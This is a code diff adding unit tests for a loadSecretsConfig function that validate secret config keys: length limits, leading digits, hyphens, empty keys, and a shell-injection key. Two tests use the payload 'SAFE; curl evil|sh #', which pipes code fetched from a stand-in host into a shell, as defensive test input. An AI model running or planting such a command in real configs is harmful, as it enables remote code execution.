@@ -95,4 +95,96 @@ describe("loadSecretsConfig", () => {
       },
     });
   });
+
+  it("rejects a shell-injection payload in the config key", () => {
+    const payload = "SAFE; curl evil|sh #";
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        [payload]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    expect(() => loadSecretsConfig(filePath)).toThrow(
+      "must be a valid environment variable name",
+    );
+  });
+
+  it("does not echo the injection payload in the error message", () => {
+    const payload = "SAFE; curl evil|sh #";
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        [payload]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    let message: string | undefined;
+    try {
+      loadSecretsConfig(filePath);
+    } catch (err) {
+      message = err instanceof Error ? err.message : String(err);
+    }
+    // Guard against a vacuous pass: an error MUST have been raised with a
+    // non-empty message. Only then is "does not contain the payload" meaningful.
+    expect(message).toBeDefined();
+    expect(message?.length).toBeGreaterThan(0);
+    expect(message).not.toContain(payload);
+  });
+
+  it("rejects a config key longer than 128 characters", () => {
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        // 129 chars → over the 128 cap.
+        ["A".repeat(129)]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    expect(() => loadSecretsConfig(filePath)).toThrow("too long");
+  });
+
+  it("accepts a config key exactly 128 characters long", () => {
+    // Boundary: 128 is valid; guards against an off-by-one regression to >= 128.
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        ["A".repeat(128)]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    expect(() => loadSecretsConfig(filePath)).not.toThrow();
+  });
+
+  it("rejects a config key starting with a digit", () => {
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        "1FOO": { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    expect(() => loadSecretsConfig(filePath)).toThrow(
+      "must be a valid environment variable name",
+    );
+  });
+
+  it("rejects a config key containing a hyphen", () => {
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        "A-B": { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    expect(() => loadSecretsConfig(filePath)).toThrow(
+      "must be a valid environment variable name",
+    );
+  });
+
+  it("rejects an empty config key", () => {
+    const filePath = writeConfigFile(JSON.stringify({
+      secrets: {
+        "": { entry: "cm1abc2def3gh4ijk5l", field: "password" },
+      },
+    }));
+
+    expect(() => loadSecretsConfig(filePath)).toThrow(
+      "must be a valid environment variable name",
+    );
+  });
 });
